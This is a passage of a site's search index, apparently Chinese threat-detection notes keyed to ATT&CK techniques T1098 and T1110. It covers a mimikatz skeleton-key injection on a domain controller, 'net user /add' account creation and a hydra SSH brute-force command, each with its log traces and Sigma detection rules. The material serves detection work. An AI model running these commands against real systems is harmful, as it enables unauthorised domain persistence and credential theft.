https://attack.mitre.org/techniques/T1098/","title":"T1098-win-\u4e07\u80fd\u5bc6\u7801"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#t1098-win-","text":"","title":"T1098-win-\u4e07\u80fd\u5bc6\u7801"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#attck","text":"\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u53d7\u5bb3\u8005\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u6216\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_1","text":"\u4f7f\u7528\u4e07\u80fd\u5bc6\u7801\uff08skeleton key\uff09\uff0c\u53ef\u4ee5\u5bf9\u57df\u5185\u6743\u9650\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#1pc","text":"C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u62d2\u7edd\u8bbf\u95ee\u3002 C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ \"admin.098\" /user:xiaomi\\administra tor \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002 \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55 2009/07/14 11:20 <DIR> PerfLogs 2020/03/23 15:24 <DIR> Program Files 2020/03/23 15:24 <DIR> Program Files (x86) 2020/03/23 14:47 <DIR> Users 2020/03/23 15:30 <DIR> Windows 0 \u4e2a\u6587\u4ef6 0 \u5b57\u8282 5 \u4e2a\u76ee\u5f55 32,728,838,144 \u53ef\u7528\u5b57\u8282 C:\\Users\\xiaomi>net use \u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u72b6\u6001 \u672c\u5730 \u8fdc\u7a0b \u7f51\u7edc ------------------------------------------------------------------------------- OK \\\\dc.xiaomi.org\\ipc$ Microsoft Windows Network \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ /del /y \\\\dc.xiaomi.org\\ipc$ \u5df2\u7ecf\u5220\u9664\u3002 C:\\Users\\xiaomi>net use \u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u5217\u8868\u662f\u7a7a\u7684\u3002","title":"\u6b65\u9aa41\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#2dc","text":"C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>mimikatz.exe \"privilege::debug \" \"misc::skeleton\" exit .#####. mimikatz 2.1.1 (x64) built on Apr 9 2017 23:24:20 .## ^ ##. \"A La Vie, A L'Amour\" ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 21 modules * * */ mimikatz(commandline) # privilege::debug Privilege '20' OK mimikatz(commandline) # misc::skeleton [KDC] data [KDC] struct [KDC] keys patch OK [RC4] functions [RC4] init patch OK [RC4] decrypt patch OK mimikatz(commandline) # exit Bye! \u7cfb\u7edf\u63d0\u793aSkeleton Key\u5df2\u7ecf\u6ce8\u5165\u6210\u529f\u3002\u6b64\u65f6\uff0c\u4f1a\u5728\u57df\u5185\u7684\u6240\u6709\u8d26\u6237\u4e2d\u6dfb\u52a0\u4e00\u4e2aSkeleton key\uff0c\u5176\u5bc6\u7801\u9ed8\u8ba4\u4e3a\u201cmimikatz\u201d\u3002\u63a5\u4e0b\u6765\u53ef\u4ee5\u4ee5\u57df\u5185\u4efb\u4f55\u7528\u6237\u7684\u8eab\u4efd\uff0c\u914d\u5408\u8be5Skeleton Key\uff0c\u8fdb\u884c\u57df\u5185\u8eab\u4efd\u6388\u6743\u9a8c\u8bc1\u4e86\u3002","title":"\u6b65\u9aa42\uff08DC\u4e0a\u6267\u884c\uff0c\u7ba1\u7406\u5458\u6743\u9650\uff09"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#3pc","text":"C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ \"mimikatz\" /user:xiaomi\\administrat or \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002 \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55 2009/07/14 11:20 <DIR> PerfLogs 2020/03/23 15:24 <DIR> Program Files 2020/03/23 15:24 <DIR> Program Files (x86) 2020/03/23 14:47 <DIR> Users 2020/03/23 15:30 <DIR> Windows 0 \u4e2a\u6587\u4ef6 0 \u5b57\u8282 5 \u4e2a\u76ee\u5f55 32,758,198,272 \u53ef\u7528\u5b57\u8282","title":"\u6b65\u9aa43\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_4","text":"windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#sigma","text":"title: Windows \u4e07\u80fd\u5bc6\u7801 description: Windows server 2008 R2\\win 7 references: https://0xsp.com/ad-attack-or-defense/ad-ttps-list tags: T1098 status: \u6d4b\u8bd5\u9636\u6bb5 author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4673 #\u8c03\u7528\u6743\u9650\u7684\u670d\u52a1 selection2: EventID: 4611 #\u53d7\u4fe1\u4efb\u7684\u767b\u5f55\u8fdb\u7a0b\u5df2\u5728\u672c\u5730\u5b89\u5168\u673a\u6784\u6ce8\u518c selection3: EventID: 4688 #\u65b0\u8fdb\u7a0b\u521b\u5efa selection4: EventID: 4689 #\u9000\u51fa\u8fdb\u7a0b condition: all of them timeframe: last 5s level: medium","title":"Sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_6","text":"\u4ee5\u4e0a\u89c4\u5219\u5b58\u5728\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4e0d\u7a33\u5b9a\u6027\uff0c\u8c28\u614e\u4f7f\u7528\uff01","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_7","text":"MITRE-ATT&CK-T1098 https://attack.mitre.org/techniques/T1098/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/","text":"T1098-win-\u8d26\u6237\u64cd\u4f5c \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u548c\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f7f\u7528windows\u7cfb\u7edf\u81ea\u8eab\u7684\u4e00\u4e9b\u5b89\u5168\u8fdb\u7a0b\uff08CMD/Powershell\u7b49\uff09\u6765\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u4e00\u4e9b\u7ecf\u5178\u7684\u5de5\u5177\u6765\u8fdb\u884c\u8d26\u6237\u64cd\u4f5c\uff08mimikatz\u7b49\uff09\u3002\u524d\u63d0\u662f\u4f60\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u8005\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Windows\\system32>net user test321 Test.321 /add \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: Net.exe\u521b\u5efa\u672c\u5730\u7528\u6237 status: \u6d4b\u8bd5\u9636\u6bb5 description: \u901a\u8fc7\u521b\u5efa\u672c\u5730\u7528\u6237net.exe\u6587\u4ef6\u547d\u4ee4 tags: - attack.t1098 logsource: category: process_creation product: windows detection: selection: Eventid: - 4688 #\u8fdb\u7a0b\u521b\u5efa\uff0cwindows \u5b89\u5168\u65e5\u5fd7\uff0cWindows server 2012\u53ca\u4ee5\u4e0a\u7248\u672c\u914d\u7f6e\u76f8\u5173\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u8bb0\u5f55\u7cfb\u7edf\u547d\u4ee4\u884c\u53c2\u6570 - 1 #\u8fdb\u7a0b\u521b\u5efa\uff0cWindows sysmon\u65e5\u5fd7\uff0c\u9700\u8981\u81ea\u884c\u5b89\u88c5\u5e76\u914d\u7f6esysmon Image|endswith: - '\\net.exe' - '\\net1.exe' CommandLine|contains|all: - 'user' - 'add' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Legit user creation - Better use event ids for user creation rather than command line rules level: medium \u5efa\u8bae \u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1098 https://attack.mitre.org/techniques/T1098/","title":"T1098-win-\u8d26\u6237\u64cd\u4f5c"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#t1098-win-","text":"","title":"T1098-win-\u8d26\u6237\u64cd\u4f5c"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#attck","text":"\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u548c\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_1","text":"\u4f7f\u7528windows\u7cfb\u7edf\u81ea\u8eab\u7684\u4e00\u4e9b\u5b89\u5168\u8fdb\u7a0b\uff08CMD/Powershell\u7b49\uff09\u6765\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u4e00\u4e9b\u7ecf\u5178\u7684\u5de5\u5177\u6765\u8fdb\u884c\u8d26\u6237\u64cd\u4f5c\uff08mimikatz\u7b49\uff09\u3002\u524d\u63d0\u662f\u4f60\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u8005\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_3","text":"C:\\Windows\\system32>net user test321 Test.321 /add \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_4","text":"windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#sigma","text":"title: Net.exe\u521b\u5efa\u672c\u5730\u7528\u6237 status: \u6d4b\u8bd5\u9636\u6bb5 description: \u901a\u8fc7\u521b\u5efa\u672c\u5730\u7528\u6237net.exe\u6587\u4ef6\u547d\u4ee4 tags: - attack.t1098 logsource: category: process_creation product: windows detection: selection: Eventid: - 4688 #\u8fdb\u7a0b\u521b\u5efa\uff0cwindows \u5b89\u5168\u65e5\u5fd7\uff0cWindows server 2012\u53ca\u4ee5\u4e0a\u7248\u672c\u914d\u7f6e\u76f8\u5173\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u8bb0\u5f55\u7cfb\u7edf\u547d\u4ee4\u884c\u53c2\u6570 - 1 #\u8fdb\u7a0b\u521b\u5efa\uff0cWindows sysmon\u65e5\u5fd7\uff0c\u9700\u8981\u81ea\u884c\u5b89\u88c5\u5e76\u914d\u7f6esysmon Image|endswith: - '\\net.exe' - '\\net1.exe' CommandLine|contains|all: - 'user' - 'add' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Legit user creation - Better use event ids for user creation rather than command line rules level: medium","title":"Sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_6","text":"\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_7","text":"MITRE-ATT&CK-T1098 https://attack.mitre.org/techniques/T1098/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/","text":"T1110-003-linux-ssh\u7206\u7834 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5f53\u5bc6\u7801\u672a\u77e5\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u5c1d\u8bd5\u8bbf\u95ee\u5e10\u6237\u5bc6\u7801\u3002\u653b\u51fb\u8005\u5728\u64cd\u4f5c\u671f\u95f4\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u767b\u5f55\uff0c\u8fd9\u662f\u4e00\u4e2a\u98ce\u9669\u8f83\u9ad8\u7684\u9009\u9879\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u5bfc\u81f4\u5927\u91cf\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u8bb0\u5f55\u4ee5\u53ca\u5e10\u6237\u9501\u5b9a\uff0c\u8d26\u6237\u9501\u5b9a\u5177\u4f53\u53d6\u51b3\u4e8e\u6240\u8bbe\u7f6e\u7684\u767b\u5f55\u5931\u8d25\u7b56\u7565\u3002 \u901a\u5e38\uff0c\u53ef\u4ee5\u5bf9\u4f7f\u7528\u5e38\u7528\u7aef\u53e3\u4e0a\u7684\u670d\u52a1\u8fdb\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u3002\u5e38\u89c1linux\u670d\u52a1\u5305\u62ec\u4ee5\u4e0b\u5185\u5bb9\uff1a SSH\uff0822/TCP\uff09 Telnet\uff0823/TCP\uff09 FTP\uff0821/ TCP\uff09 \u6d4b\u8bd5\u6848\u4f8b \u4ee5\u4e0b\u7ecf\u5178\u5de5\u5177\u53ef\u7528\u4e8e\u7aef\u53e3\u7206\u7834\uff1a Hydra Medusa Patator Brutepray \u2026\u2026 \u68c0\u6d4b\u65e5\u5fd7 linux \u7cfb\u7edf\u65e5\u5fd7\uff08auth.log\uff09 linux audit\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 root@icbc:/hacker/mima# hydra -l root -P passwd.txt ssh://192.168.159.132 -V Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. \u6d4b\u8bd5\u7559\u75d5 auth.log Failed password for root from 192.168.159.129 port 43728 ssh2 audit.log type=USER_AUTH msg=audit(1572163129.581:316): pid=2165 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.159.129 addr=192.168.159.129 terminal=ssh res=failed' \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: linux\u4e0bssh\u66b4\u529b\u7834\u89e3 description: Ubuntu18.04\u3001kali references: tags: T1110-003 status: experimental author: 12306Bro logsource: product: linux service: auth.log/audit.log detection: keywords: - 'Failed password for * ssh2' #linux auth.log - '* exe=\"/usr/sbin/sshd\" * terminal=ssh res=failed' #linux audit.log condition: keywords level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1110-003 https://attack.mitre.org/techniques/T1110/003","title":"T1110-003-linux-ssh\u7206\u7834"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#t1110-003-linux-ssh","text":"","title":"T1110-003-linux-ssh\u7206\u7834"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#attck","text":"\u5f53\u5bc6\u7801\u672a\u77e5\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u5c1d\u8bd5\u8bbf\u95ee\u5e10\u6237\u5bc6\u7801\u3002\u653b\u51fb\u8005\u5728\u64cd\u4f5c\u671f\u95f4\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u767b\u5f55\uff0c\u8fd9\u662f\u4e00\u4e2a\u98ce\u9669\u8f83\u9ad8\u7684\u9009\u9879\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u5bfc\u81f4\u5927\u91cf\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u8bb0\u5f55\u4ee5\u53ca\u5e10\u6237\u9501\u5b9a\uff0c\u8d26\u6237\u9501\u5b9a\u5177\u4f53\u53d6\u51b3\u4e8e\u6240\u8bbe\u7f6e\u7684\u767b\u5f55\u5931\u8d25\u7b56\u7565\u3002 \u901a\u5e38\uff0c\u53ef\u4ee5\u5bf9\u4f7f\u7528\u5e38\u7528\u7aef\u53e3\u4e0a\u7684\u670d\u52a1\u8fdb\u884c\u5bc6\u7801\u55b7\u5c04\u653b\u51fb\u3002\u5e38\u89c1linux\u670d\u52a1\u5305\u62ec\u4ee5\u4e0b\u5185\u5bb9\uff1a SSH\uff0822/TCP\uff09 Telnet\uff0823/TCP\uff09 FTP\uff0821/ TCP\uff09","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_1","text":"\u4ee5\u4e0b\u7ecf\u5178\u5de5\u5177\u53ef\u7528\u4e8e\u7aef\u53e3\u7206\u7834\uff1a Hydra Medusa Patator Brutepray \u2026\u2026","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_2","text":"linux \u7cfb\u7edf\u65e5\u5fd7\uff08auth.log\uff09 linux audit\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_3","text":"root@icbc:/hacker/mima# hydra -l root -P passwd.txt ssh://192.168.159.132 -V Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_4","text":"auth.log Failed password for root from 192.168.159.129 port 43728 ssh2 audit.log type=USER_AUTH msg=audit(1572163129.581:316): pid=2165 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=192.168.159.129 addr=192.168.159.129 terminal=ssh res=failed'","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#sigma","text":"title: linux\u4e0bssh\u66b4\u529b\u7834\u89e3 description: Ubuntu18.04\u3001kali references: tags: T1110-003 status: experimental author: 12306Bro logsource: product: linux service: auth.log/audit.log detection: keywords: - 'Failed password for * ssh2' #linux auth.log - '* exe=\"/usr/sbin/sshd\" * terminal=ssh res=failed' #linux audit.log condition: keywords level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-linux-ssh%E7%88%86%E7%A0%B4/#_7","text":"MITRE-ATT&CK-T1110-003 https://attack.mitre.org/techniques/T1110/003","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1110-003-win-%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84/","text":"T1110-003-windows-\u5bc6\u7801\u55b7\u5c04 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5f53\u5bc6\u7801\u672a\u77e5\u6216\u83b7\u5f97\u5bc6\u7801\u54c8\u5e0c\u503c\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u6280\u672f\u5c1d\u8bd5\u8bbf\u95ee\u5e10\u6237\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u64cd\u4f5c\u671f\u95f4\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3\u767b\u5f55\uff0c\u8fd9\u662f\u4e00\u4e2a\u98ce\u9669\u8f83\u9ad8\u7684\u9009\u9879\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u5bfc\u81f4\u5927\u91cf\u8eab\u4efd\u9a8c\u8bc1\u5931\u8d25\u8bb0\u5f55\u548c\u5e10\u6237\u9501\u5b9a\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7ec4\u7ec7\u7684\u767b\u5f55\u5931\u8d25\u7b56\u7565\u3002 \u5bc6\u7801\u55b7\u5c04\u6280\u672f\u662f\u4f7f\u7528\u4e00\u4e2a\u5bc6\u7801\uff08\u4f8b\u5982\uff0c\u201cPassword01\u201d\uff09\u6216\u4e00\u5c0f\u7ec4\u5bc6\u7801\uff0c\u5176\u5339\u914d\u57df\u7684\u590d\u6742\u6027\u7b56\u7565\u5e76\u4e14\u53ef\u4ee5\u662f\u5e38\u7528\u5bc6\u7801\u3002\u5c1d\u8bd5\u4f7f\u7528\u8be5\u5bc6\u7801\u7684 \u4e0d\u540c\u8d26\u6237 \u8fdb\u884c\u767b\u5f55\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u7ec4\u7ec7\u5185\u7684\u7b56\u7565\u5bfc\u81f4\u8d26\u6237\u9501\u5b9a\u3002 \u901a\u5e38\uff0c\u5728\u5bc6\u7801\u55b7\u5c04\u65f6\u4f7f\u7528\u5e38\u7528\u7aef\u53e3\u4e0a\u7684\u7ba1\u7406\u670d\u52a1\u3002\u901a\u7528\u76ee\u6807\u670d\u52a1\u5305\u62ec\u4ee5\u4e0b\u5185\u5bb9\uff1a SSH\uff0822/TCP\uff09 Telnet\uff0823/TCP\uff09 FTP\uff0821/ TCP\uff09 